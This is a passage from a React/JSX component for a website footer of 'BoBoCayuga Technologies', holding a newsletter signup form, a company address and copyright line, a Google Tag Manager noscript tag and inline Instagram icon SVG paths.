          " type="submit" value="Sign up for our newsletter">
                                      <span className="newsletter-form-spinner sqs-spin light large" />
                                      <span className="newsletter-form-button-label">Sign up for our newsletter</span>
                                      <span className="newsletter-form-button-icon" />
                                    </button>
                                  </div>
                                  <div className="captcha-container sqs-form-rendered
          
          align-center
          
          " data-theme="light" />
                                </div>
                                <div className="newsletter-form-footnote"><p className style={{whiteSpace: 'pre-wrap'}}>By submitting this form, I agree to receive marketing updates from BoBoCayuga Technologies. I am aware&nbsp;I can opt out at any time. View <a href="privacy-policy.php">Privacy Policy</a></p></div>
                                <div className="hidden form-submission-text"><p className data-rte-preserve-empty="true" style={{whiteSpace: 'pre-wrap'}} /></div>
                                <div className="hidden form-submission-html" data-submission-html="<BR><BR>
  <h4 style=&quot;text-align:center;&quot;>Thank you for signing up!</h4>" />
                              </form>
                            </div>
                          </div></div></div><div className="fe-block fe-block-bdf639828890a427385b"><div className="sqs-block html-block sqs-block-html" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-bdf639828890a427385b"><div className="sqs-block-content">
                            <div className="sqs-html-content">
                              <p className="sqsrte-large" style={{whiteSpace: 'pre-wrap'}}><strong>BOCAYUGA TECHNOLOGIES</strong></p><p className style={{whiteSpace: 'pre-wrap'}}>516 Cherry Lane<br />Floral Park, NY 11033</p><p className style={{whiteSpace: 'pre-wrap'}}>info@gmail.com<br />929-218-8932</p>
                            </div>
                          </div></div></div></div></div>
                </div>
              </div>
            </section>
            <section data-test="page-section" data-section-theme className="page-section 
    
      full-bleed-section
      layout-engine-section
    
    background-width--full-bleed
    
      
        section-height--custom
      
    
    
      content-width--wide
    
    horizontal-alignment--center
    vertical-alignment--middle
    
      
    
    
    " data-section-id="659eb3bfbf5e081d37f9d33c" data-controller="SectionWrapperController" data-current-styles="{
&quot;imageOverlayOpacity&quot;: 0.15,
&quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
&quot;sectionHeight&quot;: &quot;section-height--custom&quot;,
&quot;customSectionHeight&quot;: 0,
&quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
&quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
&quot;contentWidth&quot;: &quot;content-width--wide&quot;,
&quot;customContentWidth&quot;: 50,
&quot;sectionTheme&quot;: &quot;&quot;,
&quot;sectionAnimation&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;image&quot;
}" data-current-context="{
&quot;video&quot;: {
&quot;playbackSpeed&quot;: 0.5,
&quot;filter&quot;: 1,
&quot;filterStrength&quot;: 0,
&quot;zoom&quot;: 0,
&quot;videoSourceProvider&quot;: &quot;none&quot;
},
&quot;backgroundImageId&quot;: null,
&quot;backgroundMediaEffect&quot;: {
&quot;type&quot;: &quot;none&quot;
},
&quot;divider&quot;: {
&quot;enabled&quot;: false
},
&quot;typeName&quot;: &quot;page&quot;
}" data-animation="none" data-fluid-engine-section>
              <div className="section-border">
                <div className="section-background">
                </div>
              </div>
              <div className="content-wrapper" style={{paddingTop: 'calc(0vmax / 10)', paddingBottom: 'calc(0vmax / 10)'}}>
                <div className="content">
                  <div data-fluid-engine="true"><style dangerouslySetInnerHTML={{__html: ".fe-659eb3bfbf5e081d37f9d33b {\n  --grid-gutter: calc(var(--sqs-mobile-site-gutter, 6vw) - 0.0px);\n  --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (0.0px * (8 - 1)) ) / 8 );\n\n  display: grid;\n  position: relative;\n  grid-area: 1/1/-1/-1;\n  grid-template-rows: repeat(4,minmax(24px, auto));\n  grid-template-columns:\n    minmax(var(--grid-gutter), 1fr)\n    repeat(8, minmax(0, var(--cell-max-width)))\n    minmax(var(--grid-gutter), 1fr);\n  row-gap: 0.0px;\n  column-gap: 0.0px;\n}\n\n@media (min-width: 768px) {\n  .background-width--inset .fe-659eb3bfbf5e081d37f9d33b {\n    --inset-padding: calc(var(--sqs-site-gutter) * 2);\n  }\n\n  .fe-659eb3bfbf5e081d37f9d33b {\n    --grid-gutter: calc(var(--sqs-site-gutter, 4vw) - 0.0px);\n    --cell-max-width: calc( ( var(--sqs-site-max-width, 1500px) - (0.0px * (24 - 1)) ) / 24 );\n    --inset-padding: 0vw;\n\n    --row-height-scaling-factor: 0.0215;\n    --container-width: min(var(--sqs-site-max-width, 1500px), calc(100vw - var(--sqs-site-gutter, 4vw) * 2 - var(--inset-padding) ));\n\n    grid-template-rows: repeat(2,minmax(calc(var(--container-width) * var(--row-height-scaling-factor)), auto));\n    grid-template-columns:\n      minmax(var(--grid-gutter), 1fr)\n      repeat(24, minmax(0, var(--cell-max-width)))\n      minmax(var(--grid-gutter), 1fr);\n  }\n}\n\n\n  .fe-block-5325c1dc8ee6687064a0 {\n    grid-area: 2/2/4/10;\n    z-index: 0;\n  }\n\n  .fe-block-5325c1dc8ee6687064a0 .sqs-block {\n    justify-content: center;\n  }\n\n  .fe-block-5325c1dc8ee6687064a0 .sqs-block-alignment-wrapper {\n    align-items: center;\n  }\n\n  @media (min-width: 768px) {\n    .fe-block-5325c1dc8ee6687064a0 {\n      grid-area: 1/2/3/18;\n      z-index: 0;\n    }\n\n    .fe-block-5325c1dc8ee6687064a0 .sqs-block {\n      justify-content: center;\n    }\n\n    .fe-block-5325c1dc8ee6687064a0 .sqs-block-alignment-wrapper {\n      align-items: center;\n    }\n  }\n\n" }} /><div className="fluid-engine fe-659eb3bfbf5e081d37f9d33b"><div className="fe-block fe-block-5325c1dc8ee6687064a0"><div className="sqs-block html-block sqs-block-html" data-block-type={2} data-border-radii="{&quot;topLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;topRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomLeft&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0},&quot;bottomRight&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0}}" id="block-5325c1dc8ee6687064a0"><div className="sqs-block-content">
                            <div className="sqs-html-content">
                              <p className style={{whiteSpace: 'pre-wrap'}}><span className="sqsrte-text-color--accent">© 2024 BoBoCayuga Technologies  |</span><a href="terms-of-service.php" target="_blank"><span className="sqsrte-text-color--accent">Terms of Service</span></a><span className="sqsrte-text-color--accent">   |</span><a href="privacy-policy.php" target="_blank"><span className="sqsrte-text-color--accent">Privacy Policy</span></a></p>
                            </div>
                          </div></div></div></div></div>
                </div>
              </div>
            </section>
          </footer>
        </div>
        {/* Google Tag Manager (noscript) */}
        <noscript>&lt;iframe src="https://www.googletagmanager.com/ns.php?id=GTM-WPM49NKC"
          height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
        {/* End Google Tag Manager (noscript) */}<svg xmlns="http://www.w3.org/2000/svg" version="1.1" style={{display: 'none'}} data-usage="social-icons-svg"><symbol id="instagram-unauth-icon" viewBox="0 0 64 64"><path d="M46.91,25.816c-0.073-1.597-0.326-2.687-0.697-3.641c-0.383-0.986-0.896-1.823-1.73-2.657c-0.834-0.834-1.67-1.347-2.657-1.73c-0.954-0.371-2.045-0.624-3.641-0.697C36.585,17.017,36.074,17,32,17s-4.585,0.017-6.184,0.09c-1.597,0.073-2.687,0.326-3.641,0.697c-0.986,0.383-1.823,0.896-2.657,1.73c-0.834,0.834-1.347,1.67-1.73,2.657c-0.371,0.954-0.624,2.045-0.697,3.641C17.017,27.415,17,27.926,17,32c0,4.074,0.017,4.585,0.09,6.184c0.073,1.597,0.326,2.687,0.697,3.641c0.383,0.986,0.896,1.823,1.73,2.657c0.834,0.834,1.67,1.347,2.657,1.73c0.954,0.371,2.045,0.624,3.641,0.697C27.415,46.983,27.926,47,32,47s4.585-0.017,6.184-0.09c1.597-0.073,2.687-0.326,3.641-0.697c0.986-0.383,1.823-0.896,2.657-1.73c0.834-0.834,1.347-1.67,1.73-2.657c0.371-0.954,0.624-2.045,0.697-3.641C46.983,36.585,47,36.074,47,32S46.983,27.415,46.91,25.816z M44.21,38.061c-0.067,1.462-0.311,2.257-0.516,2.785c-0.272,0.7-0.597,1.2-1.122,1.725c-0.525,0.525-1.025,0.85-1.725,1.122c-0.529,0.205-1.323,0.45-2.785,0.516c-1.581,0.072-2.056,0.087-6.061,0.087s-4.48-0.015-6.061-0.087c-1.462-0.067-2.257-0.311-2.785-0.516c-0.7-0.272-1.2-0.597-1.725-1.122c-0.525-0.525-0.85-1.025-1.122-1.725c-0.205-0.529-0.45-1.323-0.516-2.785c-0.072-1.582-0.087-2.056-0.087-6.061s0.015-4.48,0.087-6.061c0.067-1.462,0.311-2.257,0.516-2.785c0.272-0.7,0.597-1.2,1.122-1.725c0.525-0.525,1.025-0.85,1.725-1.122c0.529-0.205,1.323-0.45,2.785-0.516c1.582-0.072,2.056-0.087,6.061-0.087s4.48,0.015,6.061,0.087c1.462,0.067,2.257,0.311,2.785,0.516c0.7,0.272,1.2,0.597,1.725,1.122c0.525,0.525,0.85,1.025,1.122,1.725c0.205,0.529,0.45,1.323,0.516,2.785c0.072,1.582,0.087,2.056,0.087,6.061S44.282,36.48,44.21,38.061z M32,24.297c-4.254,0-7.703,3.449-7.703,7.703c0,4.254,3.449,7.703,7.703,7.703c4.254,0,7.703-3.449,7.703-7.703C39.703,27.746,36.254,24.297,32,24.297z M32,37c-2.761,0-5-2.239-5-5c0-2.761,2.239-5,5-5s5,2.239,5,5C37,34.761,34.761,37,32,37z M40.007,22.193c-0.994,0-1.8,0.806-1.8,1.8c0,0.994,0.806,1.8,1.8,1.8c0.994,0,1.8-0.806,1.8-1.8C41.807,22.999,41.001,22.193,40.007,22.193z" /></symbol><symbol id="instagram-unauth-mask" viewBox="0 0 64 64"><path d="M43.693,23.153c-0.272-0.7-0.597-1.2-1.122-1.725c-0.525-0.525-1.025-0.85-1.725-1.122c-0.529-0.205-1.323-0.45-2.785-0.517c-1.582-0.072-2.056-0.087-6.061-0.087s-4.48,0.015-6.061,0.087c-1.462,0.067-2.257,0.311-2.785,0.517c-0.7,0.272-1.2,0.597-1.725,1.122c-0.525,0.525-0.85,1.025-1.122,1.725c-0.205,0.529-0.45,1.323-0.516,2.785c-0.072,1.582-0.087,2.056-0.087,6.061s0.015,4.48,0.087,6.061c0.067,1.462,0.311,2.257,0.516,2.785c0.272,0.7,0.597,1.2,1.122,1.725s1.025,0.85,1.725,1.122c0.529,0.205,1.323,0.45,2.785,0.516c1.581,0.072,2.056,0.087,6.061,0.087s4.48-0.015,6.061-0.087c1.462-0.067,2.257-0.311,2.785-0.516c0.7-0.272,1.2-0.597,1.725-1.122s0.85-1.025,1.122-1.725c0.205-0.529,0.45-1.323,0.516-2.785c0.072-1.582,0.087-2.056,0.087-6.061s-0.015-4.48-0.087-6.061C44.143,24.476,43.899,23.682,43.693,23.153z M32,39.703c-4.254,0-7.703-3.449-7.703-7.703s3.449-7.703,7.703-7.703s7.703,3.449,7.703,7.703S36.254,39.703,32,39.703z M40.007,25.793c-0.994,0-1.8-0.806-1.8-1.8c0-0.994,0.806-1.8,1.8-1.8c0.994,0,1.8,0.806,1.8,1.8C41.807,24.987,41.001,25.793,40.007,25.793z M0,0v64h64V0H0z M46.91,38.184c-0.073,1.597-0.326,2.687-0.697,3.641c-0.383,0.986-0.896,1.823-1.73,2.657c-0.834,0.834-1.67,1.347-2.657,1.73c-0.954,0.371-2.044,0.624-3.641,0.697C36.585,46.983,36.074,47,32,47s-4.585-0.017-6.184-0.09c-1.597-0.073-2.687-0.326-3.641-0.697c-0.986-0.383-1.823-0.896-2.657-1.73c-0.834-0.834-1.347-1.67-1.73-2.657c-0.371-0.954-0.624-2.044-0.697-3.641C17.017,36.585,17,36.074,17,32c0-4.074,0.017-4.585,0.09-6.185c0.073-1.597,0.326-2.687,0.697-3.641c0.383-0.986,0.896-1.823,1.73-2.657c0.834-0.834,1.67-1.347,2.657-1.73c0.954-0.371,2.045-0.624,3.641-0.697C27.415,17.017,27.926,17,32,17s4.585,0.017,6.184,0.09c1.597,0.073,2.687,0.326,3.641,0.697c0.986,0.383,1.823,0.896,2.657,1.73c0.834,0.834,1.347,1.67,1.73,2.657c0.371,0.954,0.624,2.044,0.697,3.641C46.983,27.415,47,27.926,47,32C47,36.074,46.983,36.585,46.91,38.184z M32,27c-2.761,0-5,2.239-5,5s2.239,5,5,5s5-2.239,5-5S34.761,27,32,27z" /></symbol></svg>
      </div>
    );
  }
});
